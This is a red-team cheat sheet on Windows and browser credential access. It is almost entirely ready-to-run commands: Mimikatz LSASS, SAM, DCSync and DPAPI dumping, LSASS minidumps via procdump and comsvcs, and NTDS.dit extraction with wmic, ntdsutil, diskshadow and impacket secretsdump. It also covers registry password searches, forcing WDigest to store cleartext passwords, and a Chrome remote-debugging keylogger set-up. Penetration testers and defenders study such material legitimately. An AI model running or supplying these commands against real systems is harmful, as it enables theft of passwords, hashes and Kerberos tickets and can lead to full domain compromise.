---
title: Credential Access
date: 2026-01-22
background: bg-[#A855F7]
icon: lock-open.svg
tags:
  - credentials
  - dumping
  - mimikatz
  - red teaming
  - penetration testing
categories:
  - Tactics, Techniques, and Procedures
intro:
  Credential harvesting and dumping techniques commonly observed in real-world intrusions.
plugins:
  - copyCode
---

## Mimikatz

### Check for Appropirate permissions
In most cases you  must be NT\System to dump credentials. Especially if accessing the LSASS process.
```mkatz
privilege::debug
```

### Dumping SAM/Local Accounts

#### Dump SAM
```mkatz
lsadump::sam
```
#### Dump Local System Accoutns (LSA)
```mkatz
lsadump::lsa
```


### Dumping LSASS {.row-span-2}

#### Dump Cleartext / NTLM / Kerberos

```mkatz
sekurlsa::logonpasswords
```

#### Dump NTLM hashes only
```mkatz
sekurlsa::msv
```

#### Dump Kerberos tickets in memory
```mkatz
sekurlsa::kerberos
```

#### Dump credentials from a minidump
```mkatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Dump Domain Credentials (DCSync)
No LSASS interaction required. Relies on replication permissions.
```mkatz
lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Dump Cred Vaults / DPAPI

#### Dump DPAPI master keys
```mkatz
sekurlsa::dpapi
```

#### Chrome / browser secrets (context dependent)
```mkatz
dpapi::chrome
```
See:[Mimikatz](https://github.com/ParrotSec/mimikatz)


## Windows Based Access and Dumps

### Dump LSASS with Procdump
[!NOTE] Requires NT\System permissions [!NOTE]
```powershell
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```

### Dump LSASS with Comsvcs {.col-span-2}
[!NOTE] Requires NT\System permissions [!NOTE]
```powershell
.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
```
See: [MiniDump w/ COM+](https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/)

### Dump SAM via Registry
SAM
```powershell
reg save HKLM\SAM sam.save  
```
System
```cmd
reg save HKLM\SYSTEM system.save  
```

Combine using samdump2

```bash
samdump2 system sam 
```

### Dump SAM via Esentutl
esentutl is a Windows LoLBin

```powershell {.wrap}
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
```

See: [Dumping SAM](https://superuser.com/questions/364290/how-to-dump-the-windows-sam-file-while-the-system-is-running)


### Dump LSA via Registry
```powershell
reg save HKLM\SYSTEM system & reg save HKLM\security security
```

combine in mimikatz ran in remote machine
```mkatz {.wrap}
lsadump::secrets /system:c:\temp\system /security:c:\temp\security
```

### Dump NTDS.dit Hashes Using WMIC - Credentials {.col-span-2}

Create a shadow copy of `C`
```powershell {.wrap}
wmic /node:dc01 /user:administrator@domain /password:123456 process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
```

Copy `NTDS.dit` `SYSTEM` and `SECRURITY` to `C:\temp`
```powershell {.wrap}
wmic /node:dc01 /user:administrator@domain /password:123456 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
```

Mount the shadow copy locally to retrieve the files
```powershell
net use j: \\dc01\c$\temp /user:administrator 123456; dir j:\
```



### Dump NTDS.dit Hashes Using ntdsutil

[!NOTE] This does not require credentials, but must at least have access to the DC. [!NOTE]

```powershell
ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
```

dump hashes offline with impacket
```bash
secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
```

### Dump NTDS.dit Hashes Using diskshadow {.row-span-2}
[!NOTE] This does not require credentials, but must at least have access to the DC. [!NOTE]

On DCs Windows server version 2008+ we can use diskshadow to grab the ntdis.dit

first we must create a diskshadow script to create a new copy of `C:\ ` or where ever ntds.dit is located and expose it to a new drive

```script
set context persistent nowriters
set metadata c:\exfil\metadata.cab
add volume c: alias trophy
create
expose %someAlias% z:
```

Then we excuse it

```powershell
mkdir c:\exfil
diskshadow.exe /s C:\users\Administrator\Desktop\shadow.txt
cmd.exe /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
```

### Dump NTDS.dit Hashes Using Impacket - Credentials
```bash {.wrap}
impacket-secretsdump -just-dc-ntlm domain/administrator@10.10.13.37
```

### Credentials in Registry
Search Hive Key Local Machine for `password`

```powershell
reg query HKLM /f password /t REG_SZ /s
```

Search Hive Key Current User for `password`
```powershell
reg query HKCU /f password /t REG_SZ /s
```

### Poison-The-Well WDigest
WDigest is a Security Support Provider within LSASS that stores crednetials in plain text. After Win8, by default WDigest is turned off on systems. 

The registry still exists though and we can turn it on to force the credential store to be used again.

```powershell {.wrap}
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
``` 

Once turned on the next logon authentcation will begin populating the store
 

## Browser Based Access and Dumps

### Chromium Poison-The-Well Debugger KeyLoger 

This attack requires that you already have access to the host through a c2 system. 

First you must poison the shortcut to make either Chrome or Edge start with a debugger port.

Normally this can be accomplished by changing the target to 
` "C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 `

If the browser is already running you can force a crash or wait until a new instance is started

Now import a script like [SilentFrame](github.com/Emulated-Criminals/SilentFrame) or similar 

